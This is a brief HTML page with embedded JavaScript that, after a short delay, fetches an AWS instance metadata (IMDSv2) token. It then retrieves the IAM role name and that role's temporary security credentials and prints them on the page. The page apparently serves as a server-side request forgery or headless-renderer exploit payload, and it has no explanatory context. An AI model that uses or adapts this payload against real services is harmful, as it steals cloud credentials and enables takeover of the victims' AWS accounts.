<!DOCTYPE html>
<html>
<body>
  <pre id="o">Waiting for IMDSv2...</pre>
  <script>
    setTimeout(async () => {
      try {
        const tokenRes = await fetch("http://169.254.169.254/latest/api/token", {
          method: "PUT",
          headers: {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        });
        const token = await tokenRes.text();

        const roleRes = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
          headers: {"X-aws-ec2-metadata-token": token}
        });
        const role = (await roleRes.text()).trim();

        const credsRes = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`, {
          headers: {"X-aws-ec2-metadata-token": token}
        });
        const creds = await credsRes.text();

        document.getElementById("o").innerHTML = "Success!\n\n" + creds;
      } catch(e) {
        document.getElementById("o").innerHTML = "Error: " + e.message;
      }
    }, 1500); // 1.5 second delay
  </script>
</body>
</html>
